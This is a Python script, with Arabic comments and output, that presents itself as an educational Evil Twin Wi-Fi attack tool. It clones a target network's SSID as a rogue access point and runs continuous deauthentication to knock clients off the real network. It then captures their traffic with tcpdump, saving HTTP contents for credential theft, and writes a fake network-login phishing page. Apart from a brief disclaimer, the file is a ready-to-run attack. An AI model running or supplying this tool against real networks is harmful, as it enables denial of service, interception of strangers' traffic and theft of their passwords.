#!/usr/bin/env python3
"""
أداة تعليمية لمحاكاة هجوم Evil Twin
ملاحظة: للاستخدام التعليمي والاختبار على الشبكات المملوكة لك فقط
"""

import subprocess
import time
import os
import sys
import threading

class EvilTwinAttack:
    def __init__(self):
        self.interface = "wlan0"
        self.monitor_interface = "wlan0mon"
        self.fake_ap_interface = "wlan1"
        self.target_ssid = ""
        self.fake_ssid = ""
        self.channel = "1"
        self.hostapd_conf = "hostapd.conf"
        self.dnsmasq_conf = "dnsmasq.conf"
        
    def check_dependencies(self):
        """التحقق من تثبيت الأدوات المطلوبة"""
        required_tools = ["aircrack-ng", "hostapd", "dnsmasq", "iptables"]
        for tool in required_tools:
            try:
                if tool == "hostapd":
                    subprocess.run(["which", "hostapd"], check=True, capture_output=True)
                else:
                    subprocess.run([tool, "--version"], capture_output=True)
                print(f"✓ {tool} مثبت")
            except (subprocess.CalledProcessError, FileNotFoundError):
                print(f"✗ {tool} غير مثبت")
                return False
        return True
    
    def setup_interfaces(self):
        """إعداد واجهات الشبكة"""
        try:
            print("إيقاف خدمات الشبكة...")
            subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], check=True)
            subprocess.run(["sudo", "systemctl", "stop", "wpa_supplicant"], check=True)
            
            print("تفعيل وضع المراقبة...")
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
            subprocess.run(["sudo", "airmon-ng", "start", self.interface], check=True)
            
            print("إنشاء واجهة افتراضية للـ AP...")
            subprocess.run(["sudo", "iw", self.monitor_interface, "interface", "add", self.fake_ap_interface, "type", "__ap"], check=True)
            
            time.sleep(2)
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"خطأ في إعداد الواجهات: {e}")
            return False
    
    def scan_networks(self):
        """مسح الشبكات المتاحة"""
        print("جاري مسح الشبكات المتاحة...")
        try:
            process = subprocess.Popen(
                ["sudo", "airodump-ng", self.monitor_interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(10)
            process.terminate()
            stdout, stderr = process.communicate()
            
            # عرض الشبكات المكتشفة
            print("الشبكات المكتشفة:")
            for line in stdout.split('\n'):
                if "ESSID" in line:
                    print(line)
                elif len(line) > 0 and not line.startswith('BSSID'):
                    parts = line.split()
                    if len(parts) > 13:
                        ssid = ' '.join(parts[13:])
                        print(f"BSSID: {parts[0]}, Channel: {parts[5]}, SSID: {ssid}")
            
            return True
        except Exception as e:
            print(f"خطأ في المسح: {e}")
            return False
    
    def create_hostapd_config(self):
        """إنشاء ملف配置 لـ hostapd"""
        config_content = f"""interface={self.fake_ap_interface}
driver=nl80211
ssid={self.fake_ssid}
hw_mode=g
channel={self.channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        
        with open(self.hostapd_conf, "w") as f:
            f.write(config_content)
        print("✓ تم إنشاء ملف hostapd configuration")
    
    def create_dnsmasq_config(self):
        """إنشاء ملف配置 لـ dnsmasq"""
        config_content = f"""interface={self.fake_ap_interface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
"""
        
        with open(self.dnsmasq_conf, "w") as f:
            f.write(config_content)
        print("✓ تم إنشاء ملف dnsmasq configuration")
    
    def setup_network(self):
        """إعداد الشبكة الافتراضية"""
        try:
            print("إعداد واجهة الـ AP...")
            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", self.fake_ap_interface], check=True)
            subprocess.run(["sudo", "ip", "link", "set", self.fake_ap_interface, "up"], check=True)
            
            print("تفعيل الـ IP forwarding...")
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            
            print("إعداد قواعد iptables...")
            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"], check=True)
            subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", self.fake_ap_interface, "-o", "eth0", "-j", "ACCEPT"], check=True)
            subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", "eth0", "-o", self.fake_ap_interface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], check=True)
            
            return True
        except subprocess.CalledProcessError as e:
            print(f"خطأ في إعداد الشبكة: {e}")
            return False
    
    def deauth_attack(self, target_bssid):
        """هجوم إلغاء المصادقة لفصل العملاء عن الشبكة الحقيقية"""
        def deauth_thread():
            try:
                print("بدء هجوم إلغاء المصادقة...")
                deauth_cmd = [
                    "sudo", "aireplay-ng",
                    "--deauth", "0",  # استمرار الإرسال
                    "-a", target_bssid,  # BSSID الهدف
                    self.monitor_interface
                ]
                subprocess.run(deauth_cmd)
            except Exception as e:
                print(f"خطأ في هجوم deauth: {e}")
        
        thread = threading.Thread(target=deauth_thread)
        thread.daemon = True
        thread.start()
        return thread
    
    def start_fake_ap(self):
        """بدء نقطة الوصول المزيفة"""
        try:
            print("بدء نقطة الوصول المزيفة...")
            hostapd_process = subprocess.Popen(
                ["sudo", "hostapd", self.hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            print("بدء خادم DHCP و DNS...")
            dnsmasq_process = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", self.dnsmasq_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            return hostapd_process, dnsmasq_process
            
        except Exception as e:
            print(f"خطأ في بدء الـ AP المزيف: {e}")
            return None, None
    
    def capture_credentials(self):
        """مراقبة وcapture بيانات الاعتماد"""
        print("جاري مراقبة حركة المرور لسرقة بيانات الاعتماد...")
        try:
            # إنشاء مجلد لحفظ البيانات المسروقة
            if not os.path.exists("captured_data"):
                os.makedirs("captured_data")
            
            # بدء tcpdump لcapture الحركة
            tcpdump_process = subprocess.Popen([
                "sudo", "tcpdump",
                "-i", self.fake_ap_interface,
                "-w", "captured_data/traffic.pcap"
            ])
            
            # مراقبة حركة HTTP لسرقة بيانات التسجيل
            http_sniffer = subprocess.Popen([
                "sudo", "tcpdump",
                "-i", self.fake_ap_interface,
                "-A", "tcp", "and", "port", "80"
            ], stdout=open("captured_data/http_data.txt", "w"))
            
            return tcpdump_process, http_sniffer
            
        except Exception as e:
            print(f"خطأ في capture البيانات: {e}")
            return None, None
    
    def create_phishing_page(self):
        """إنشاء صفحة تصيد لسرقة بيانات الاعتماد"""
        phishing_html = """<!DOCTYPE html>
<html>
<head>
    <title>Network Authentication Required</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .login-box { width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }
        input { width: 100%; padding: 8px; margin: 5px 0; }
        button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Network Authentication</h2>
        <p>Please enter your credentials to access the network</p>
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>"""
        
        with open("phishing.html", "w") as f:
            f.write(phishing_html)
        print("✓ تم إنشاء صفحة التصيد")
    
    def cleanup(self):
        """تنظيف الموارد"""
        try:
            print("جاري التنظيف...")
            
            # إيقاف جميع العمليات
            subprocess.run(["sudo", "pkill", "hostapd"], capture_output=True)
            subprocess.run(["sudo", "pkill", "dnsmasq"], capture_output=True)
            subprocess.run(["sudo", "pkill", "tcpdump"], capture_output=True)
            subprocess.run(["sudo", "pkill", "aireplay-ng"], capture_output=True)
            
            # إعادة تعيين iptables
            subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
            subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
            
            # إعادة تعيين واجهات الشبكة
            subprocess.run(["sudo", "ip", "link", "set", self.fake_ap_interface, "down"], capture_output=True)
            subprocess.run(["sudo", "iw", "dev", self.fake_ap_interface, "del"], capture_output=True)
            subprocess.run(["sudo", "airmon-ng", "stop", self.monitor_interface], capture_output=True)
            
            # إعادة تشغيل خدمات الشبكة
            subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], capture_output=True)
            
            # حذف الملفات المؤقتة
            for file in [self.hostapd_conf, self.dnsmasq_conf, "phishing.html"]:
                if os.path.exists(file):
                    os.remove(file)
            
            print("✓ تم التنظيف بنجاح")
            
        except Exception as e:
            print(f"خطأ أثناء التنظيف: {e}")

def main():
    """الدالة الرئيسية"""
    attack = EvilTwinAttack()
    
    print("أداة Evil Twin التعليمية - للأغراض التعليمية فقط")
    print("=" * 50)
    
    # التحقق من التبعيات
    if not attack.check_dependencies():
        print("يجب تثبيت الأدوات المطلوبة أولاً")
        sys.exit(1)
    
    try:
        # إعداد الواجهات
        if not attack.setup_interfaces():
            sys.exit(1)
        
        # مسح الشبكات
        attack.scan_networks()
        
        # الحصول على بيانات الشبكة المستهدفة
        attack.target_ssid = input("أدخل SSID الشبكة المستهدفة: ")
        attack.fake_ssid = attack.target_ssid  # استخدام نفس الاسم
        attack.channel = input("أدخل قناة الشبكة: ")
        target_bssid = input("أدخل BSSID الشبكة المستهدفة: ")
        
        # إنشاء ملفات التهيئة
        attack.create_hostapd_config()
        attack.create_dnsmasq_config()
        attack.create_phishing_page()
        
        # إعداد الشبكة
        if not attack.setup_network():
            sys.exit(1)
        
        # بدء هجوم deauth
        deauth_thread = attack.deauth_attack(target_bssid)
        
        # بدء الـ AP المزيف
        hostapd_process, dnsmasq_process = attack.start_fake_ap()
        if not hostapd_process:
            sys.exit(1)
        
        # بدء capture البيانات
        tcpdump_process, http_sniffer = attack.capture_credentials()
        
        print("الهجوم يعمل... اضغط Ctrl+C لإيقافه")
        print("يتم الآن سرقة بيانات المستخدمين المتصلين...")
        
        # الانتظار حتى إيقاف البرنامج
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nتم إيقاف الهجوم بواسطة المستخدم")
    finally:
        attack.cleanup()

if __name__ == "__main__":
    # تحذير أمني
    print("⚠️  تحذير هام: هذا البرنامج للأغراض التعليمية فقط")
    print("استخدامه على شبكات الآخرين بدون إذن غير قانوني")
    print("أنت المسؤول عن استخدامك لهذه الأداة")
    
    response = input("هل تريد المتابعة؟ (نعم/لا): ")
    if response.lower() in ['نعم', 'yes', 'y']:
        main()
    else:
        print("تم إلغاء التشغيل")